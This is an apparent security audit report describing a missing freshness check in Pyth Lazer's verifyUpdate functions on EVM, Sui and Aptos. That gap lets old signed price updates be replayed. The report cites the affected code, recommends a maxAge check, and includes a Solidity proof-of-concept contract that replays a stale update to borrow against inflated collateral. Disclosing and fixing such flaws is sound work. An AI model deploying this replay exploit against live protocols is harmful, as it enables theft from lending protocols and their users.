### Title
`PythLazer.verifyUpdate` Does Not Validate Payload Timestamp, Enabling Stale Price Replay Attacks — (`lazer/contracts/evm/src/PythLazer.sol`)

---

### Summary

`PythLazer.sol::verifyUpdate` is the sole on-chain security boundary for Pyth Lazer consumers. It verifies the ECDSA signature and checks that the signer key has not expired, but it **never validates that the timestamp embedded in the signed payload is recent**. Because Lazer payloads are signed blobs that any observer can capture from the public WebSocket stream, an attacker can replay an arbitrarily old signed update through `verifyUpdate`, receive a "verified" payload containing a stale price, and exploit the price discrepancy in any consumer protocol — directly analogous to the Tellor oracle-staling flash-loan attack in the reference report.

---

### Finding Description

`PythLazer.sol::verifyUpdate` performs three checks:

1. EVM format magic (`EVM_FORMAT_MAGIC = 706910618`)
2. ECDSA signature recovery
3. `isValidSigner(signer)` — checks `block.timestamp < trustedSignerToExpiresAtMapping[signer]`

```solidity
// lazer/contracts/evm/src/PythLazer.sol  lines 70-106
function verifyUpdate(
    bytes calldata update
) external payable returns (bytes calldata payload, address signer) {
    ...
    payload = update[71:71 + payload_len];
    bytes32 hash = keccak256(payload);
    (signer, , ) = ECDSA.tryRecover(hash, ...);
    if (signer == address(0)) revert("invalid signature");
    if (!isValidSigner(signer)) revert("invalid signer");
    // ← NO check that payload timestamp ≈ block.timestamp
}
``` [1](#0-0) 

The payload itself carries a `timestamp` field (microseconds since epoch) parsed by `PythLazerLib::parsePayloadHeader`:

```solidity
// lazer/contracts/evm/src/PythLazerLib.sol  lines 110-136
function parsePayloadHeader(bytes memory update)
    public pure
    returns (uint64 timestamp, Channel channel, uint8 feedsLen, uint16 pos)
{
    ...
    timestamp = _readBytes8(update, pos);   // ← timestamp is in the payload
    ...
}
``` [2](#0-1) 

`verifyUpdate` returns the raw `payload` bytes to the caller without ever comparing `timestamp` to `block.timestamp`. The signer-expiry check (`isValidSigner`) only guards against a rotated key; it says nothing about when the price data was produced.

The same structural gap exists in the Sui and Aptos Lazer contracts:

- **Sui** — `verify_le_ecdsa_message` checks `clock.timestamp_ms() < expires_at_ms` (signer expiry) but never compares the payload timestamp to `clock.timestamp_ms()`. [3](#0-2) 

- **Aptos** — `verify_message` checks `signer_info.expires_at > timestamp::now_seconds()` (signer expiry) but never validates the message timestamp. [4](#0-3) 

The official EVM integration guide shows consumers checking only monotonicity (`_timestamp > timestamp`), not freshness against `block.timestamp`:

```solidity
// apps/developer-hub/.../evm.mdx  lines 101-104
if (feedId == 2 && _timestamp > timestamp) {
    price = _price;
    timestamp = _timestamp;
}
``` [5](#0-4) 

This means the canonical integration pattern is itself vulnerable to replay.

---

### Impact Explanation

Any consumer protocol that calls `verifyUpdate` and uses the returned price without independently enforcing `block.timestamp - payload_timestamp < MAX_AGE` is vulnerable to:

1. **Stale-price replay**: An attacker replays a signed update from hours or days ago. The price passes `verifyUpdate` because the signer key is still valid. The consumer accepts a price that no longer reflects market reality.
2. **Flash-loan exploitation**: The attacker selects a historical price that is favorable (e.g., an asset was 15% higher two hours ago), replays it, and uses the inflated price to borrow against over-valued collateral, redeem at a discount, or liquidate positions incorrectly — identical in structure to the Tellor flash-loan scenario in the reference report.
3. **Persistent manipulation**: Unlike a one-time arbitrage, the attacker can replay the same old signed update in every block for as long as the signer key remains valid (signer keys are set with very long expiry, e.g., `3000000000000000` in the test suite). [6](#0-5) 

---

### Likelihood Explanation

- Lazer price updates are broadcast over a public WebSocket stream. Any subscriber can capture and store signed payloads indefinitely.
- No special privilege is required: the attacker only needs to call `verifyUpdate` with a previously observed signed blob.
- Signer keys have very long validity windows (governance-set, potentially years), so the replay window is large.
- The official integration documentation does not warn consumers to enforce freshness, making vulnerable integrations the expected outcome.

---

### Recommendation

Add a `maxAge` parameter (or a hardcoded constant) to `verifyUpdate` and reject payloads whose embedded timestamp is older than `block.timestamp - maxAge`:

```solidity
// Suggested addition inside verifyUpdate, after recovering payload:
(uint64 payloadTimestamp, , , ) = PythLazerLib.parsePayloadHeader(
    abi.encodePacked(payload)
);
// payloadTimestamp is in microseconds; convert to seconds
require(
    block.timestamp <= payloadTimestamp / 1_000_000 + MAX_AGE_SECONDS,
    "stale price update"
);
```

Alternatively, expose a `verifyUpdateNoOlderThan(bytes calldata update, uint64 maxAgeSecs)` variant so consumers can enforce freshness at the verification layer rather than relying on post-hoc timestamp inspection.

The same fix should be applied to `verify_le_ecdsa_message` (Sui) and `verify_message` (Aptos).

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {PythLazer} from "pyth-lazer-sdk/PythLazer.sol";
import {PythLazerLib} from "pyth-lazer-sdk/PythLazerLib.sol";

contract ReplayAttack {
    PythLazer public pythLazer;

    // `oldUpdate` is a real signed Lazer payload captured from the WebSocket
    // stream at a time when the asset price was 15% higher than today.
    bytes public oldUpdate;

    constructor(address _pythLazer, bytes memory _oldUpdate) {
        pythLazer = PythLazer(_pythLazer);
        oldUpdate = _oldUpdate;
    }

    function exploit(address victimProtocol) external payable {
        uint256 fee = pythLazer.verification_fee();

        // Step 1: replay the old signed update — verifyUpdate passes because
        // the signer key is still valid; no timestamp check is performed.
        (bytes memory payload, ) = pythLazer.verifyUpdate{value: fee}(oldUpdate);

        // Step 2: parse the stale (inflated) price from the verified payload.
        (uint64 staleTimestamp, , , ) = PythLazerLib.parsePayloadHeader(payload);
        // staleTimestamp is hours old but verifyUpdate accepted it.

        // Step 3: use the inflated price in the victim protocol
        // (e.g., borrow against over-valued collateral, redeem at a discount).
        IVictim(victimProtocol).borrowAgainstLazerPrice{value: msg.value}(payload);
    }
}
```

**Execution trace**:
1. Attacker subscribes to the Lazer WebSocket and records a signed EVM-format update at time `T` when `asset_price = P_high`.
2. At time `T + N hours`, when `asset_price = P_low` (e.g., 15% lower), attacker calls `exploit`.
3. `verifyUpdate` succeeds: signature is valid, signer key has not expired.
4. Consumer protocol reads `P_high` from the verified payload and treats it as current.
5. Attacker profits from the `P_high - P_low` discrepancy.

### Citations

**File:** lazer/contracts/evm/src/PythLazer.sol (L70-106)
```text
    function verifyUpdate(
        bytes calldata update
    ) external payable returns (bytes calldata payload, address signer) {
        // Require fee and refund excess
        require(msg.value >= verification_fee, "Insufficient fee provided");
        if (msg.value > verification_fee) {
            payable(msg.sender).transfer(msg.value - verification_fee);
        }

        if (update.length < 71) {
            revert("input too short");
        }
        uint32 EVM_FORMAT_MAGIC = 706910618;

        uint32 evm_magic = uint32(bytes4(update[0:4]));
        if (evm_magic != EVM_FORMAT_MAGIC) {
            revert("invalid evm magic");
        }
        uint16 payload_len = uint16(bytes2(update[69:71]));
        if (update.length < 71 + payload_len) {
            revert("input too short");
        }
        payload = update[71:71 + payload_len];
        bytes32 hash = keccak256(payload);
        (signer, , ) = ECDSA.tryRecover(
            hash,
            uint8(update[68]) + 27,
            bytes32(update[4:36]),
            bytes32(update[36:68])
        );
        if (signer == address(0)) {
            revert("invalid signature");
        }
        if (!isValidSigner(signer)) {
            revert("invalid signer");
        }
    }
```

**File:** lazer/contracts/evm/src/PythLazerLib.sol (L110-136)
```text
    function parsePayloadHeader(
        bytes memory update
    )
        public
        pure
        returns (
            uint64 timestamp,
            PythLazerStructs.Channel channel,
            uint8 feedsLen,
            uint16 pos
        )
    {
        uint32 FORMAT_MAGIC = 2479346549;

        pos = 0;
        uint32 magic = _readBytes4(update, pos);
        pos += 4;
        if (magic != FORMAT_MAGIC) {
            revert("invalid magic");
        }
        timestamp = _readBytes8(update, pos);
        pos += 8;
        channel = PythLazerStructs.Channel(_readBytes1(update, pos));
        pos += 1;
        feedsLen = uint8(_readBytes1(update, pos));
        pos += 1;
    }
```

**File:** lazer/contracts/sui/sources/pyth_lazer.move (L43-64)
```text
public(package) fun verify_le_ecdsa_message(
    state: &State,
    clock: &Clock,
    signature: &vector<u8>,
    payload: &vector<u8>,
) {
    let current_cap = state.current_cap();

    // 0 stands for keccak256 hash
    let pubkey = secp256k1_ecrecover(signature, payload, 0);

    // Check if the recovered pubkey is in the trusted signers list
    let trusted_signers = state.trusted_signers(&current_cap);
    let mut maybe_idx = trusted_signers.find_index!(|signer|
        signer.public_key() == &pubkey
    );

    assert!(maybe_idx.is_some(), ESignerNotTrusted);
    let idx = maybe_idx.extract();
    let expires_at_ms = trusted_signers[idx].expires_at_ms();
    assert!(clock.timestamp_ms() < expires_at_ms, ESignerExpired);
}
```

**File:** lazer/contracts/aptos/sources/pyth_lazer.move (L103-141)
```text
    /// Verify a message signature with provided fee
    /// The provided `fee` must contain enough coins to pay a single update fee, which
    /// can be queried by calling calling get_update_fee().
    public fun verify_message(
        message: vector<u8>,
        signature: vector<u8>,
        trusted_signer: vector<u8>,
        fee: coin::Coin<AptosCoin>
    ) acquires Storage {
        let storage = borrow_global<Storage>(@pyth_lazer);

        // Verify fee amount
        assert!(coin::value(&fee) >= storage.single_update_fee, EINSUFFICIENT_FEE);

        // Transfer fee to treasury
        coin::deposit(storage.treasury, fee);

        // Verify signer is trusted and not expired
        let i = 0;
        let valid = false;
        while (i < storage.trusted_signers.length()) {
            let signer_info = vector::borrow(&storage.trusted_signers, (i as u64));
            if (&signer_info.pubkey == &trusted_signer
                && signer_info.expires_at > timestamp::now_seconds()) {
                valid = true;
                break
            };
            i = i + 1;
        };
        assert!(valid, EINVALID_SIGNER);

        // Verify signature
        let sig = ed25519::new_signature_from_bytes(signature);
        let pk = ed25519::new_unvalidated_public_key_from_bytes(trusted_signer);
        assert!(
            ed25519::signature_verify_strict(&sig, &pk, message),
            EINVALID_SIGNATURE
        );
    }
```

**File:** apps/developer-hub/content/docs/price-feeds/pro/integrate-as-consumer/evm.mdx (L101-104)
```text
            if (feedId == 2 && _timestamp > timestamp) {
                price = _price;
                timestamp = _timestamp;
            }
```

**File:** lazer/contracts/evm/test/PythLazer.t.sol (L47-49)
```text
        address trustedSigner = 0xb8d50f0bAE75BF6E03c104903d7C3aFc4a6596Da;
        vm.prank(owner);
        pythLazer.updateTrustedSigner(trustedSigner, 3000000000000000);
```
